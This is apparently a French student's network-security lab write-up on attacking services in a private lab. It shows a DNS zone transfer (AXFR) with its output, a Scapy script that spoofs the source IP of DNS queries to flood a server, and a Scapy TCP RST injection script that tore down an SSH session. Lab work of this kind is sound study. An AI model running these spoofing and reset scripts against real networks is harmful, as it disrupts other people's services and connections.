# Partie IV : Attaques sur les services en place

## Sommaire

- [Partie IV : Attaques sur les services en place](#partie-iv--attaques-sur-les-services-en-place)
  - [Sommaire](#sommaire)
  - [1. DNS](#1-dns)
    - [A. Transfert de zone](#a-transfert-de-zone)
    - [B. Flood](#b-flood)
  - [2. TCP](#2-tcp)
    - [A. TCP RST](#a-tcp-rst)

## 1. DNS

### A. Transfert de zone

🌞 **Requêter l'enregistrement AXFR**

```
root@debian:~# dig @dns.tp3.b2 tp3.b2 axfr

; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> @dns.tp3.b2 tp3.b2 axfr
; (1 server found)
; global options: +cmd

tp3.b2.              86400   IN      SOA     dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
tp3.b2.              86400   IN      NS      dns.tp3.b2.
coolsite.tp3.b2.     86400   IN      A       10.3.3.4
dns.tp3.b2.          86400   IN      A       10.3.3.1
meow.tp3.b2.         86400   IN      A       10.3.3.6
prout.tp3.b2.        86400   IN      A       10.3.3.5
supersite.tp3.b2.    86400   IN      A       10.3.3.2
web.tp3.b2.          86400   IN      A       10.3.3.4
web2.tp3.b2.         86400   IN      A       10.3.3.5
web3.tp3.b2.         86400   IN      A       10.3.3.6
web4.tp3.b2.         86400   IN      A       10.3.3.2
tp3.b2.              86400   IN      SOA     dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400

; Query time: 39 msec
; SERVER: 10.3.3.1#53(dns.tp3.b2) (TCP)
; WHEN: Fri Jan 17 10:33:35 CET 2025
; XFR size: 12 records (messages 1, bytes 352)
```

### B. Flood

🌞 **Spoof DNS query**

```
from scapy.all import *

dns_request = IP(src="10.3.2.10", dst="10.3.3.1") / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname="tp3.b2", qtype="AXFR"))

send(dns_request, verbose=0)
```
[DNS flood](flood_dns.pcapng)

## 2. TCP

### A. TCP RST


🌞 **Mettre en place une attaque TCP RST**

```
J'ai établie une connexion SSH entre 2 machines, et j'ai récupéré les numéros "seq" et "ack" sur le dernier packet de la capture wireshark.
La connexion SSH a bien été intérompue.
```
```
from scapy.all import *

src_ip = "10.3.3.2"
dst_ip = "10.3.3.1"
src_port = 58068
dst_port = 22

seq_number = 1773907393
ack_number = 867093078

rst_packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_number, ack=ack_number)

send(rst_packet, verbose=1)
```

[TCP RST](tcp_rst.pcapng)